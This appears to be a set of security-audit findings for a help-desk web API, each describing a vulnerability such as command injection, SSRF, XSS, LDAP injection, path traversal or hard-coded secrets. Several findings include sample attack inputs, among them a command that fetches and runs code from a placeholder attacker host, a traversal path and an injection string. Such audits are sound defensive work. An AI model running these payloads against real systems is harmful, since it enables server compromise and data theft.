extra.message: The user-controlled 'preset' query parameter (GET /api/export/tickets/archive, import-export.controller.ts:89-94) is interpolated directly into a shell command string passed to spawn() with shell:true. An authenticated SUPPORT_ADMIN or TEAM_LEAD can inject arbitrary OS commands (e.g. preset=1;curl${IFS}attacker/x|sh). The parallel escalations path (packageEscalationsExport) correctly uses an allowlist and argv array, confirming this is an oversight.

The 'format' path parameter of GET /api/knowledge-base/:id/render/:format (knowledge-base.controller.ts:78-82) is user-controlled and, unlike the allowlisted escalations digest path, is never validated before being embedded into an execSync shell string. Any authenticated user (only JwtAuthGuard is applied) can inject shell metacharacters via format, e.g. html;touch${IFS}/tmp/pwn;, to achieve arbitrary command execution on the server.

importRemoteDocument() fetches the attacker-supplied 'documentUrl' body parameter server-side with no validation against internal/link-local addresses (only ticket access is checked). An authenticated user with ticket access can make the server issue requests to internal hosts (e.g. http://169.254.169.254/, http://localhost:3000/) enabling SSRF against the internal network or cloud metadata service. The downloaded content is then written to disk, allowing internal resources to be exfiltrated via later attachment downloads.

The public GET /api/portal/handoff endpoint passes the attacker-controlled 'x-redirect-url' request header straight to res.redirect() (portal.service.ts resolvePortalHandoffDestination simply returns it with no allowlist). An attacker can craft a link that redirects a victim to an arbitrary external site (phishing/credential theft). Contrast with escalations.resolveVendorHandoffDestination which correctly validates against an allowlist.

cwe: CWE-601: URL Redirection to Untrusted Site

extra.message: findSubjectMatterExpert() concatenates the user-controlled 'search' query parameter into an LDAP filter string `(&(objectClass=user)(cn=*${searchTerm}*))` without escaping. Unlike customers.service.verifyDirectoryContact(), which escapes input with escapeLdapFilter(), the raw value reaches the directory service, so a caller (the endpoint only requires JwtAuthGuard) can inject LDAP filter syntax such as *)(objectClass=*)(cn=* to broaden the query and extract directory entries.

cwe: CWE-90: Improper Neutralization of Special Elements in an LDAP Query

extra.message: On every rejected login the entire LoginDto, including the plaintext password, is written to the application log via JSON.stringify(loginDto). Passwords end up in log files/aggregators (CWE-532) where they can be read by anyone with log access, enabling credential-stuffing or account takeover. Only the email (or a redacted form) should be logged.

cwe: CWE-532: Insertion of Sensitive Information into Log File

extra.message: JWT verification/issuance falls back to the hard-coded literal secret 'default-secret' when JWT_SECRET is unset (also in auth.module.ts:13 and portal.service.ts:46,56 uses PORTAL_LINK_SECRET||'default-secret'). A publicly known secret lets an attacker forge arbitrary JWTs (including SUPPORT_ADMIN role tokens) and portal bookmark tokens, fully bypassing authentication if the environment variable is missing.

buildIncidentPayload() exposes exception.stack and request.query to any remote caller who simply sets the 'workspaceContext=verbose' cookie before triggering an error, regardless of NODE_ENV. This leaks full stack traces (internal paths, dependency versions, code structure) and query strings to unauthenticated/unprivileged users (CWE-209/CWE-200).

cwe: CWE-209: Generation of Error Message Containing Sensitive Information

extra.message: exportTicketTranscript() (GET /api/tickets/:id/transcript) loads ALL replies with no isInternal filter and returns their full content. Customers of the owning organization are allowed through the check at lines 381-383, so a customer can read internal staff replies that getTicket()/listReplies() explicitly hide from customers, disclosing internal-only conversation content (CWE-200/broken access control).

The public embed endpoint interpolates article.title and article.content into an HTML response with no escaping. When embed=true the response sets only 'frame-ancestors *' (no restrictive script CSP), so author-controlled markup stored in a published article is rendered as active HTML and can execute script in the API origin of any reader's browser (stored XSS, CWE-79).

cwe: CWE-79: Improper Neutralization of Input During Web Page Generation

extra.message: The public embeddable escalation summary handler injects escalation.ticket.subject and escalation.reason into an HTML string without any encoding/escaping before res.send(). Escalation subject/reason can contain markup, producing HTML/script injection in the response body of this unauthenticated endpoint (reflected/stored XSS, CWE-79).

cwe: CWE-79: Improper Neutralization of Input During Web Page Generation

extra.message: listEscalations() restricts TEAM_LEAD to their team's escalations and SUPPORT_AGENT to their own requested escalations, but a CUSTOMER_USER (or any other role) falls through with an empty 'where' clause and receives ALL escalations across every organization, including ticket subjects/status and requester/owner emails. getEscalation() likewise has no customer/agent branch, allowing cross-tenant enumeration and reading of escalation details (missing authorization, CWE-862).

updateTicket() (and changeStatus(), lines 288-336) only enforce an organization check for CUSTOMER_USER; any staff member - including a SUPPORT_AGENT or TEAM_LEAD who is not on the ticket's team/assignee - can update the subject/description/priority or change the status of any ticket in any organization. This bypasses the team/assignment scoping enforced by assertTicketAccess() in getTicket() and by listTickets(), an object-level broken-access-control/IDOR issue (CWE-862).

stageImportBatch() writes `${batchLabel}.csv` to the staging directory where batchLabel is taken straight from the attacker-controlled 'importWorkspace' cookie (import-export.controller.ts:30-34) without sanitization. A label such as ../../../../tmp/evil lets a caller write a .csv file to an arbitrary path on the server (path traversal / arbitrary file write). Unlike cacheExportSnapshot(), no basename() normalization is applied.

cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory

extra.message: createContact() creates every new customer contact with the fixed, publicly known default password 'changeme123' and never forces a change or communicates a password to the user. Anyone who learns the contact's email (exposed via listContacts) can log in as that contact account (default-credential account takeover, CWE-798). The same static fallback 'changeme123' is used when importing customers via CSV (import-export.service.ts:58).

listNotes()/createNote() gate only on role (any staff member) but never verify the caller is on the ticket's team or is the assignee (no assertTicketAccess). A SUPPORT_AGENT can read and write internal notes for tickets they are not allowed to view or handle (listTickets/getTicket forbid such tickets), an object-level authorization gap exposing internal notes across teams (CWE-862).
